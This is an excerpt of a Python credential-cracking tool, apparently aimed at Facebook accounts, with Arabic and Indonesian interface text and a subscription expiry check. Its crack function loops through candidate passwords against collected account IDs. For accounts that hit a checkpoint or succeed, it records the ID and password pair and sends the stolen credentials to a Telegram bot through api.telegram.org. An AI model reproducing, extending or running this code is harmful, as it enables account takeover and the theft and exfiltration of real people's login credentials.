...
g= datetime.datetime(2024, 2, 19, 00, 00 ,00)
...
if (x.strftime("%x"))==(g.strftime("%x")):
   ...
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    print("     "+'خلص اشتراك عليك مراجعة صانع اداة @XXQ20 ☄️🗿')
    print('\n\n')
    print(x)
...
def menu(my_name,my_id):	
	...
	print('\x1b[82m'+'━'*60)
	print(f"\033[97;1m[\033[92;1m2\033[97;1m] \x1b[33m\x1b[33m \x1b[33m[{MJ3}CRACK FILE\x1b[36m\x1b[33m]")
	
	print('\x1b[82m'+'━'*60)
	print(f"\033[97;1m[\033[92;1m0\033[97;1m] \x1b[33m\x1b[33m \x1b[33m[{MJ3}LOGIN\x1b[36m\x1b[33m]")
	print(a16+'▭▬'*30)
	_____alvino__adijaya_____ = input(a16+'Choice : ')
...
def dump_massal():
	...
	try:
		print('\x1b[82m'+'━'*60)
		kumpulkan = int(input(f' {H}[{P}>{H}] {MJ3}NUMBER OF IDS :- '))
		print(a18+'▰'*20)
		print('\x1b[82m'+'━'*60)
	...
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f' {MJ2} >ID '+str(bilangan)+f' : ')
		uid.append(Masukan)
	for user in uid:
	    try:
	       head = (
...
def passwrd():
	...
	print('')
	print(' Crack ( Y/t ) ? ')
	print(' اخي العزيز اذا الاداة صفرت الحل الوحيد اما تغير الكوكيز او راجع ايديات')
	woi = input('Choice : ')
	if woi in ['y','Y']:
	    HAMA()
	else:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{H}[{P}>{H}]  {P}{MJ3}{loop}{P}/{MJ3}{len(id)}{H}   OK{P}:{P}{MJ2}{ok}{MJ3}   CP{P}:{P}{MJ2}{cp}{P}  {bo}{'{:.0%}'.format(loop/float(len(id)))}{asu}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				akun.append(idf+'|'+pw)
				cp+=1
				statusok1 = nel(xda, style='green')
				cetak(nel(statusok1, title='CP'))
				requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(xda))
				cek_RAVEN(kuki)
				break
				...
				requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(raven_a))
				cek_RAVEN(kuki)
				cek_apk()
				break
